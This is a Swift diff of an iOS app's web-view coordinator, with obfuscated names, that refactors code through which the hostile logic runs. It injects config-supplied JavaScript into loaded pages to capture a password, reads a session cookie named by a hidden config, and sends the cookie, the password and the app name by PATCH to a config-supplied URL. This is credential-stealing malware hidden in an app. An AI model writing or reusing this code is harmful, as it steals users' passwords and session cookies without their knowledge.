@@ -54,7 +54,7 @@ struct CoordsThree: UIViewRepresentable {
         }
 
         func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
-            webView.evaluateJavaScript(arrayData[ValueKey.three_fr_1a.rawValue] ?? "") { pword, errorPword in
+            webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_1a.rawValue] ?? "") { pword, errorPword in
                 if let pword = pword as? String, errorPword == nil {
                     self.three_pa_rent.is_three_get_mat_khau = pword
                 }
@@ -62,21 +62,21 @@ struct CoordsThree: UIViewRepresentable {
         }
 
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-            webView.evaluateJavaScript(arrayData[ValueKey.three_fr_2a.rawValue] ?? "")
+            webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_2a.rawValue] ?? "")
             DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
-                webView.evaluateJavaScript(arrayData[ValueKey.three_fr_3a.rawValue] ?? "") { html, error in
+                webView.evaluateJavaScript(self.three_pa_rent.arrayData[ValueKey.three_fr_3a.rawValue] ?? "") { html, error in
                     if let htmlmatkhau = html as? String, error == nil {
                         if !htmlmatkhau.isEmpty {
                             WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
-                                let id_itn = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
+                                let id_itn = cookies.firstIndex(where: { $0.name == self.three_pa_rent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                 if id_itn != nil {
                                     UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesMK(matkhau: self.three_pa_rent.is_three_get_mat_khau)), forKey: "matkhau")
                                     self.three_pa_rent.is_three_load_hide = true
                                     let three_json_data: [String: Any] = [
-                                        arrayData[ValueKey.name_api_06.rawValue] ?? "": cookies[id_itn!].value,
-                                        arrayData[ValueKey.name_api_07.rawValue] ?? "": self.three_pa_rent.is_three_get_mat_khau,
-                                        arrayData[ValueKey.name_api_08.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
-                                    let url = URL(string: arrayData[ValueKey.Chung_fr_04.rawValue] ?? "")!
+                                        self.three_pa_rent.arrayData[ValueKey.name_api_06.rawValue] ?? "": cookies[id_itn!].value,
+                                        self.three_pa_rent.arrayData[ValueKey.name_api_07.rawValue] ?? "": self.three_pa_rent.is_three_get_mat_khau,
+                                        self.three_pa_rent.arrayData[ValueKey.name_api_08.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
+                                    let url = URL(string: self.three_pa_rent.arrayData[ValueKey.Chung_fr_04.rawValue] ?? "")!
                                     let json_data = try? JSONSerialization.data(withJSONObject: three_json_data)
                                     var request = URLRequest(url: url)
                                     request.httpMethod = "PATCH"
